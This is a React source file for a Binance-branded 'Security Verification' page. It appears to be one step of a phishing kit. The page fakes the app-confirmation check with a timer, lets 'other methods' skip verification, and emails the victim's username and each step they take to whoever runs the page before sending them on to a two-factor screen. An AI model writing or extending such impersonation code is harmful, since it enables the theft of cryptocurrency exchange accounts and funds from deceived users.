
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Smartphone, Shield, CheckCircle2 } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";

interface SecurityVerificationProps {
  username: string;
  onVerificationSuccess: () => void;
  onBack: () => void;
}

const SecurityVerification: React.FC<SecurityVerificationProps> = ({ 
  username, 
  onVerificationSuccess, 
  onBack 
}) => {
  const [isVerifying, setIsVerifying] = useState(false);
  const { toast } = useToast();

  const handleVerifyApp = async () => {
    setIsVerifying(true);
    
    // Send email notification
    try {
      await sendEmailNotification({
        step: "Security Verification - App Verification",
        username,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    
    // Simulate app verification
    setTimeout(() => {
      setIsVerifying(false);
      onVerificationSuccess();
      toast({
        title: "Verification successful",
        description: "Proceeding to two-factor authentication.",
      });
    }, 3000);
  };

  const handleOtherMethods = async () => {
    // Send email notification
    try {
      await sendEmailNotification({
        step: "Security Verification - Other Methods",
        username,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    
    // Skip to next step for "other methods"
    onVerificationSuccess();
    toast({
      title: "Using alternative verification",
      description: "Proceeding to two-factor authentication.",
    });
  };

  const handleBack = async () => {
    // Send email notification
    try {
      await sendEmailNotification({
        step: "Security Verification - Back to Login",
        username,
        timestamp: new Date().toISOString()
      });
    } catch (error) {
      console.error('Email notification failed:', error);
    }
    
    onBack();
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          <div className="text-center mb-8">
            <div className="flex justify-center mb-4">
              <div className="bg-binance-yellow/10 p-4 rounded-full">
                <Shield className="w-12 h-12 text-binance-yellow" />
              </div>
            </div>
            <h1 className="text-2xl font-bold text-white mb-2">Security Verification</h1>
            <p className="text-[#848E9C] text-base mb-4">
              Open Binance app on your phone
            </p>
            <div className="bg-[#2B3139] rounded-lg p-3 mb-4">
              <p className="text-[#B7BDC6] text-sm">
                Account: <span className="text-binance-yellow font-semibold">{username}</span>
              </p>
            </div>
          </div>

          <div className="space-y-6">
            <div className="bg-[#181A20] rounded-lg p-6 border border-[#2B3139]">
              <div className="flex items-center gap-4 mb-4">
                <Smartphone className="w-8 h-8 text-binance-yellow flex-shrink-0" />
                <div className="flex-1">
                  <h3 className="text-white font-semibold text-lg mb-2">Check Your Phone</h3>
                  <p className="text-[#848E9C] text-sm leading-relaxed">
                    Binance has sent a notification to your phone. Open your Binance App and confirm on the prompt to verify it's you.
                  </p>
                </div>
              </div>
              
              <Button
                onClick={handleVerifyApp}
                disabled={isVerifying}
                className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
              >
                {isVerifying ? (
                  <div className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
                    Verifying...
                  </div>
                ) : (
                  <div className="flex items-center gap-2">
                    <CheckCircle2 className="w-5 h-5" />
                    I've Confirmed on My Phone
                  </div>
                )}
              </Button>
            </div>

            <div className="text-center">
              <button
                onClick={handleOtherMethods}
                className="text-binance-yellow hover:underline text-sm font-medium"
              >
                Use Other Methods to Complete Verification
              </button>
            </div>

            <div className="text-center">
              <button
                onClick={handleBack}
                className="text-[#B7BDC6] hover:text-[#848E9C] text-sm"
              >
                Back to Login
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecurityVerification;
